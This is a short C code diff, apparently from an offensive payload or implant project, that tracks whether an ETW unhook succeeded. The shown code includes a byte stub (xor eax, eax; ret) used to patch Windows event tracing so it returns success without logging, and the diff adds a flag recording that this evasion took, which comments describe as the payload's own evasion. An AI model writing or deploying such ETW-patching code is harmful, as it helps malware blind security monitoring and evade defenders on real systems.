@@ -62,6 +62,8 @@
 /* xor eax, eax ; ret -> STATUS_SUCCESS without tracing. */
 static const unsigned char px_etw_stub[] = { 0x31, 0xC0, 0xC3 };
 
+/* Whether the ETW unhook actually took. The capability library
+ * reports it, so a run can say whether its own evasion worked. */
 /* Unhook ETW.
  *
  * Returns 1 on success, 0 on failure. Failure is not fatal: the payload
@@ -103,6 +105,7 @@ int px_etw_unhook(void)
     }
 
     FlushInstructionCache(GetCurrentProcess(), prologue, sizeof(px_etw_stub));
+    px_etw_patched = 1;
     return 1;
 }
 
